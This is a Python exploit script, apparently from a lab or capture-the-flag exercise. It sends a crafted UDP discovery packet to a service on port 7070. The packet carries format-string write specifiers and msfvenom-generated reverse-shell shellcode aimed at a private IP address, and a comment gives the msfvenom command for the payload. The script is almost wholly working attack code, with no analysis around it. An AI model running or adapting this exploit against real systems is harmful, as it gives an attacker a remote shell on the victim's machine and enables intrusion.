#!/usr/bin/env python
import struct
import socket
import sys

ip = '192.168.137.110'
port = 7070

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x05\x82\xca"
shellcode += b"\x5d\x43\xd1\x19\x24\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x6f\xab\x92\xc4\x29"
shellcode += b"\xd3\x46\x4e\x04\xdc\xc5\x58\x0b\x46\x51\x9d"
shellcode += b"\x07\x82\xd5\xcc\x83\x79\x28\xad\x54\xca\x43"
shellcode += b"\xbb\x29\xc1\x43\x4e\x2f\xda\xc5\x58\x29\xd2"
shellcode += b"\x47\x6c\xfa\x4c\xa0\x7c\x1b\xde\x1c\x51\xf3"
shellcode += b"\xe8\xf1\x05\xda\x99\xa2\x0b\x67\xeb\xa4\x72"
shellcode += b"\x30\xb9\x19\x77\x4d\x0b\x2d\x0f\x14\x99\x90"
shellcode += b"\xc2\x0a\x87\xca\x5d\x43\xd1\x19\x24"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')